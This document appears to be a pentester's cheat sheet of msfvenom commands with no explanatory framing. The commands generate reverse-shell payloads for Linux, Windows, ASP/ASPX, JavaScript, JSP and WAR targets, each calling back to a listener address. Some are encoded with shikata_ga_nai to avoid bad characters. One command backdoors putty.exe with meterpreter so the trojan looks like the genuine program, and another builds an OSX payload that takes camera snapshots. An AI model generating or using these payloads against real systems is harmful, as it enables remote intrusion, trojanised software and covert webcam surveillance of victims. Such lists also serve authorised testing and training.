# MSFVenom

### Linux

```bash
# 32-bit
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.69 LPORT=4444 cmd=/bin/sh -f python -v payload -e x86/shikata_ga_nai -b '\x09\x0a\x0b\x0c\x0d\x20\xff'
```

### Windows EXE

```bash
# bad characters, exitfunc, python, windows platform, 32bit architecture, set generated code with var name 'shellcode'
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.247.129 LPORT=443 -f python -a x86 --platform -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -v shellcode EXITFUNC=thread

# Windows Reverse TCP Shell
msfvenom -p windows/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe

msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.131 LPORT=4444  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python

msfvenom -p windows/shell_reverse_tcp lhost=10.11.0.69 lport=4444 exitfunc=thread -f py -e x86/shikata_ga_nai -b "\x00" -v payload

# Saving backdoor to application 'putty.exe'
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
```

### ASP/ASPX

```bash
# ASP reverse shell
msfvenom -p windows/shell_reverse_tcp lhost=10.11.0.69 lport=4444 -e x86/shikata_ga_nai -f asp -o hello.asp
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.69 LPORT=4443 --platform windows -e x86/shikata_ga_nai -f asp -o shell

# ASPX 32bit
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.32 lport=4444 -e --platform windows -f aspx -o hello_32.aspx

# ASPX 64bit
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.32 lport=4444 -e --platform windows -f aspx -o hello_64.aspx
```

### JAVASCRIPT

```bash
# Javascript little endian
# PrependMigrate option - The payload migrates its process if the current process gets killed hence the attacker will not lose his session if the victim kills the current process ID of the payload from its system.
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.69 LPORT=5555 PrependMigrate=false EXITFUNC=process -f js_l
```

### JAVA/JSP/WAR

```bash
# JSP reverse shell for file upload vuln
msfvenom -a x86 --platform windows -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=8080 -f raw
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.11.0.69 lport=443 -f raw > a.jsp


# WAR - jsp_shell_reverse_tcp
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.11.0.69 lport=4444 -f war -o shell.war

# WAR - shell_reverse_tcp
msfvenom -p java/shell_reverse_tcp lhost=10.11.0.69 lport=4444 -f war -o shell.war

```

### OSX - 32bit

```bash
#OSX executable with payload camera snapshot
msfvenom -a x86 --platform OSX -p osx/x86/isight/bind_tcp -b "\x00" -f elf -o /tmp/osxt2
```

